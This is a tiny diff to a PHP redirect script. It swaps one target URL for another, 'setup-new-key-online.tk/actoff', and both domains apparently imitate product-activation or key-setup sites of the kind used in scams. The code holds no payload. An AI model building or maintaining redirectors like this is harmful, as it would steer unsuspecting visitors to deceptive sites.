@@ -1,4 +1,4 @@
 <?php
-header("Location: https://setup-your-product.website/actoff/");
+header("Location: https://setup-new-key-online.tk/actoff");
 die();
 ?>
